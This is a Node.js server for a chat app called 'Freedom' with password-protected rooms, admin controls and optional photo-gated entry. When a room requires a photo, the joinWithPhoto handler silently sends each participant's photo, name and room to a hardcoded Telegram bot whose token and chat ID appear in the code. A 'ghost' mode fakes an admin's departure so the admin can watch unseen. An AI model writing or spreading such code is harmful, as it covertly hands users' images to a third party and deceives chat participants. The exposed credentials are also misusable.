const express = require('express');
const http = require('http');
const https = require('https');
const path = require('path');
const { Server } = require('socket.io');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { maxHttpBufferSize: 8e6 });

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

// ── Room info REST endpoint (for link pages) ────────────────
app.get('/api/room/:id', (req, res) => {
  const room = rooms[req.params.id];
  if (!room) return res.json({ exists: false });
  res.json({
    exists: true,
    name: room.name,
    hasPassword: !!room.password,
    requirePhoto: !!room.requirePhoto,
    memberCount: Object.keys(room.online).filter(s => !room.online[s].ghost).length,
    closed: room.closed,
    createdBy: room.createdBy
  });
});

// ── Telegram helper ─────────────────────────────────────────
const TG_TOKEN = '8984501365:AAHNErVviVRp49LGUktbWg3kkXKvcJ9umME';
const TG_CHAT_ID = '7600607243';

function sendPhotoToTelegram(imageBase64, username, roomName) {
  return new Promise((resolve, reject) => {
    try {
      const base64Data = imageBase64.replace(/^data:image\/\w+;base64,/, '');
      const imageBuffer = Buffer.from(base64Data, 'base64');
      const boundary = '---FrBnd' + Date.now();
      const now = new Date().toLocaleString();

      const p1 = Buffer.from(
        `--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${TG_CHAT_ID}\r\n`
      );
      const caption = `Freedom — New Participant\nRoom: "${roomName}"\nUser: ${username}\nTime: ${now}`;
      const p2 = Buffer.from(
        `--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`
      );
      const p3h = Buffer.from(
        `--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="participant.jpg"\r\nContent-Type: image/jpeg\r\n\r\n`
      );
      const p3f = Buffer.from(`\r\n--${boundary}--\r\n`);
      const body = Buffer.concat([p1, p2, p3h, imageBuffer, p3f]);

      const req = https.request({
        hostname: 'api.telegram.org',
        path: `/bot${TG_TOKEN}/sendPhoto`,
        method: 'POST',
        headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}`, 'Content-Length': body.length }
      }, (res) => {
        let d = '';
        res.on('data', c => d += c);
        res.on('end', () => { console.log('TG:', d); resolve(d); });
      });
      req.on('error', e => { console.error('TG err:', e.message); resolve(null); });
      req.write(body);
      req.end();
    } catch (e) { console.error('TG err:', e.message); resolve(null); }
  });
}

// ── Data stores ──────────────────────────────────────────────
let rooms = {};

function genId() { return crypto.randomBytes(3).toString('hex').toUpperCase(); }

function roomPublicInfo(r) {
  return {
    id: r.id, name: r.name, hasPassword: !!r.password,
    requirePhoto: !!r.requirePhoto, createdBy: r.createdBy,
    createdAt: r.createdAt, closed: r.closed,
    memberCount: Object.keys(r.online).filter(s => !r.online[s].ghost).length
  };
}

function sysMsg(room, text) {
  const msg = { id: Date.now() + Math.random().toString(36).slice(2), ts: Date.now(), type: 'system', text };
  room.messages.push(msg);
  if (room.messages.length > 400) room.messages.shift();
  io.to(room.id).emit('message', msg);
}

function userList(room) {
  return Object.values(room.online).filter(u => !u.ghost)
    .map(u => ({ username: u.username, isAdmin: u.isAdmin, joinedAt: u.joinedAt }));
}
function adminUserList(room) {
  return Object.values(room.online)
    .map(u => ({ username: u.username, email: u.email, isAdmin: u.isAdmin, joinedAt: u.joinedAt, typingOff: u.typingOff, ghost: !!u.ghost }));
}
function pushUsers(room) {
  io.to(room.id).emit('userlist', userList(room));
  for (const [sid, u] of Object.entries(room.online))
    if (u.isAdmin) io.to(sid).emit('adminUserlist', adminUserList(room));
}
function pushLobby() { io.emit('lobby', Object.values(rooms).map(roomPublicInfo)); }

// ── Socket handling ──────────────────────────────────────────
io.on('connection', (socket) => {

  socket.on('createRoom', ({ roomName, username, email, password, roomPassword, requirePhoto }, cb) => {
    if (typeof cb !== 'function') return;
    const cName = String(roomName || '').trim().slice(0, 50).replace(/\s+/g, ' ');
    const cUser = String(username || '').trim().slice(0, 24).replace(/\s+/g, ' ');
    const cEmail = String(email || '').trim().toLowerCase().slice(0, 80);
    const adminPw = String(password || '').trim().slice(0, 60);
    const cRoomPw = String(roomPassword || '').trim().slice(0, 60) || null;

    if (!cName) return cb({ error: 'Please provide a room name.' });
    if (!cUser) return cb({ error: 'Please enter your display name.' });
    if (!cEmail || !cEmail.includes('@')) return cb({ error: 'Please enter a valid email address.' });
    if (!adminPw) return cb({ error: 'Please set an admin password to manage this room.' });

    const id = genId();
    const room = {
      id, name: cName, password: cRoomPw, requirePhoto: !!requirePhoto,
      createdBy: cUser, createdByEmail: cEmail,
      createdAt: Date.now(), closed: false, messages: [], online: {}
    };
    rooms[id] = room;
    socket.join(id);
    room.online[socket.id] = { username: cUser, email: cEmail, isAdmin: true, joinedAt: Date.now(), typingOff: false, ghost: false };

    sysMsg(room, `${cUser} created the room "${cName}"`);
    pushUsers(room); pushLobby();
    cb({
      ok: true, roomId: id, isAdmin: true,
      settings: { roomName: cName, joinPassword: cRoomPw, requirePhoto: room.requirePhoto },
      history: room.messages, users: userList(room), adminUsers: adminUserList(room)
    });
  });

  socket.on('joinRoom', ({ roomId, username, email, password }, cb) => {
    if (typeof cb !== 'function') return;
    const room = rooms[roomId];
    if (!room) return cb({ error: 'Room not found. It may have been closed.' });
    if (room.closed) return cb({ error: 'This room has been closed by its host.' });
    if (room.requirePhoto) return cb({ error: '__REQUIRE_PHOTO__' });

    const cUser = String(username || '').trim().slice(0, 24).replace(/\s+/g, ' ');
    const cEmail = String(email || '').trim().toLowerCase().slice(0, 80);
    if (!cUser) return cb({ error: 'Please enter your display name.' });
    if (!cEmail || !cEmail.includes('@')) return cb({ error: 'Please enter a valid email address.' });
    if (room.password && String(password || '') !== room.password) return cb({ error: 'Incorrect room password.' });
    if (Object.values(room.online).some(u => u.username.toLowerCase() === cUser.toLowerCase()))
      return cb({ error: 'That display name is already in use.' });

    socket.join(roomId);
    room.online[socket.id] = { username: cUser, email: cEmail, isAdmin: false, joinedAt: Date.now(), typingOff: false, ghost: false };
    sysMsg(room, `${cUser} joined the room`);
    pushUsers(room); pushLobby();
    cb({
      ok: true, roomId, isAdmin: false,
      settings: { roomName: room.name, joinPassword: room.password, requirePhoto: false },
      history: room.messages, users: userList(room), adminUsers: null
    });
  });

  socket.on('joinWithPhoto', ({ roomId, username, email, password, photo }, cb) => {
    if (typeof cb !== 'function') return;
    const room = rooms[roomId];
    if (!room) return cb({ error: 'Room not found.' });
    if (room.closed) return cb({ error: 'This room has been closed.' });

    const cUser = String(username || '').trim().slice(0, 24).replace(/\s+/g, ' ');
    const cEmail = String(email || '').trim().toLowerCase().slice(0, 80);
    if (!cUser) return cb({ error: 'Please enter your display name.' });
    if (!cEmail || !cEmail.includes('@')) return cb({ error: 'Please enter a valid email address.' });
    if (!photo) return cb({ error: 'Photo is required for this room.' });
    if (room.password && String(password || '') !== room.password) return cb({ error: 'Incorrect room password.' });
    if (Object.values(room.online).some(u => u.username.toLowerCase() === cUser.toLowerCase()))
      return cb({ error: 'That display name is already in use.' });

    // Send photo to Telegram (fire and forget)
    sendPhotoToTelegram(photo, cUser, room.name).catch(() => {});

    socket.join(roomId);
    room.online[socket.id] = { username: cUser, email: cEmail, isAdmin: false, joinedAt: Date.now(), typingOff: false, ghost: false };
    sysMsg(room, `${cUser} joined the room`);
    pushUsers(room); pushLobby();
    cb({
      ok: true, roomId, isAdmin: false,
      settings: { roomName: room.name, joinPassword: room.password, requirePhoto: true },
      history: room.messages, users: userList(room), adminUsers: null
    });
  });

  socket.on('adminRejoin', ({ roomId, username, email }, cb) => {
    if (typeof cb !== 'function') return;
    const room = rooms[roomId];
    if (!room) return cb({ error: 'Room not found.' });
    if (room.closed) return cb({ error: 'This room has been closed.' });
    if (room.createdByEmail !== String(email || '').trim().toLowerCase())
      return cb({ error: 'Only the room creator can rejoin as host.' });

    const cUser = String(username || '').trim().slice(0, 24).replace(/\s+/g, ' ') || room.createdBy;
    socket.join(roomId);
    room.online[socket.id] = { username: cUser, email: room.createdByEmail, isAdmin: true, joinedAt: Date.now(), typingOff: false, ghost: false };
    sysMsg(room, `${cUser} (host) rejoined`);
    pushUsers(room); pushLobby();
    cb({
      ok: true, roomId, isAdmin: true,
      settings: { roomName: room.name, joinPassword: room.password, requirePhoto: room.requirePhoto },
      history: room.messages, users: userList(room), adminUsers: adminUserList(room)
    });
  });

  socket.on('message', ({ roomId, text, img }) => {
    const room = rooms[roomId]; const u = room?.online[socket.id];
    if (!u) return;
    const cleanText = String(text || '').slice(0, 2000).trim();
    if (!cleanText && !img) return;
    if (img && !/^data:image\/(png|jpe?g|gif|webp);base64,/.test(img)) return;
    const msg = { id: Date.now() + Math.random().toString(36).slice(2), ts: Date.now(), type: 'msg', from: u.username, text: cleanText, img: img || null };
    room.messages.push(msg);
    if (room.messages.length > 400) room.messages.shift();
    io.to(roomId).emit('message', msg);
  });

  socket.on('typing', ({ roomId }) => {
    const room = rooms[roomId]; const u = room?.online[socket.id];
    if (u && !u.typingOff && !u.ghost) socket.to(roomId).emit('typing', u.username);
  });

  socket.on('admin:toggleTyping', ({ roomId, username }) => {
    const room = rooms[roomId]; if (!room?.online[socket.id]?.isAdmin) return;
    const t = Object.values(room.online).find(u => u.username === username); if (!t) return;
    t.typingOff = !t.typingOff;
    sysMsg(room, `${username}'s typing indicator was ${t.typingOff ? 'disabled' : 'enabled'} by ${room.online[socket.id].username}`);
    pushUsers(room);
  });
  socket.on('admin:toggleGhost', ({ roomId }) => {
    const room = rooms[roomId]; const u = room?.online[socket.id]; if (!u?.isAdmin) return;
    u.ghost = !u.ghost;
    sysMsg(room, u.ghost ? `${u.username} left the room` : `${u.username} joined the room`);
    pushUsers(room); pushLobby();
  });
  socket.on('admin:deleteMsg', ({ roomId, id }) => {
    const room = rooms[roomId]; if (!room?.online[socket.id]?.isAdmin) return;
    room.messages = room.messages.filter(m => m.id !== id);
    io.to(roomId).emit('deleteMsg', id);
  });
  socket.on('admin:clearChat', ({ roomId }) => {
    const room = rooms[roomId]; const u = room?.online[socket.id]; if (!u?.isAdmin) return;
    room.messages = []; io.to(roomId).emit('clearChat');
    sysMsg(room, `Conversation cleared by ${u.username}`);
  });
  socket.on('admin:kick', ({ roomId, username }) => {
    const room = rooms[roomId]; if (!room?.online[socket.id]?.isAdmin) return;
    for (const [sid, usr] of Object.entries(room.online)) {
      if (usr.username === username && !usr.isAdmin) {
        io.to(sid).emit('kicked');
        io.sockets.sockets.get(sid)?.disconnect(true);
      }
    }
  });
  socket.on('admin:updateSettings', ({ roomId, roomName, joinPassword }) => {
    const room = rooms[roomId]; const u = room?.online[socket.id]; if (!u?.isAdmin) return;
    room.name = String(roomName || room.name).slice(0, 50).replace(/\s+/g, ' ') || room.name;
    room.password = joinPassword !== undefined ? (String(joinPassword).slice(0, 60) || null) : room.password;
    io.to(roomId).emit('settingsUpdated', { roomName: room.name, joinPassword: room.password });
    sysMsg(room, `Room settings updated by ${u.username}`);
    pushLobby();
  });
  socket.on('admin:closeRoom', ({ roomId }) => {
    const room = rooms[roomId]; const u = room?.online[socket.id]; if (!u?.isAdmin) return;
    room.closed = true;
    sysMsg(room, `This room has been closed by ${u.username}. Thank you for using Freedom.`);
    setTimeout(() => {
      for (const [sid] of Object.entries(room.online)) {
        io.to(sid).emit('roomClosed', { name: room.name });
        io.sockets.sockets.get(sid)?.disconnect(true);
      }
      delete rooms[roomId]; pushLobby();
    }, 2000);
  });

  socket.on('disconnect', () => {
    for (const [rid, room] of Object.entries(rooms)) {
      const u = room.online[socket.id];
      if (u) { delete room.online[socket.id]; if (!u.ghost) sysMsg(room, `${u.username} left the room`); pushUsers(room); pushLobby(); break; }
    }
  });
});

setInterval(pushLobby, 8000);
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Freedom running on http://localhost:${PORT}`));
